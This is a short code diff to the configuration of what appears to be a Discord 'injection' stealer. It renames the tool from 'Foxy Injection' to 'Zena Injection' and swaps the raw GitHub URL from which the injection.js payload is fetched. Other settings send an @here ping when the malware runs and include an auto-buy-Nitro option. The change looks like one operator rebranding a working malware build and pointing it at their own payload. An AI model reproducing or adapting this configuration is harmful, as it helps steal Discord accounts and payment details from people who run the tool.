@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: false,
   ping_on_run: true,
   ping_val: '@here',
-  embed_name: 'Foxy Injection',
+  embed_name: 'Zena Injection',
   embed_icon: 'https://cdn.discordapp.com/attachments/1040380029005205605/1052894433118523402/Rocket.png'.replace(/ /g, '%20'),
   embed_color: 5639644,
-  injection_url: 'https://raw.githubusercontent.com/KingKrex69/Discord-Injection/main/injection.js',
+  injection_url: 'https://raw.githubusercontent.com/thezelax/discord-injection/main/injection.js',
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
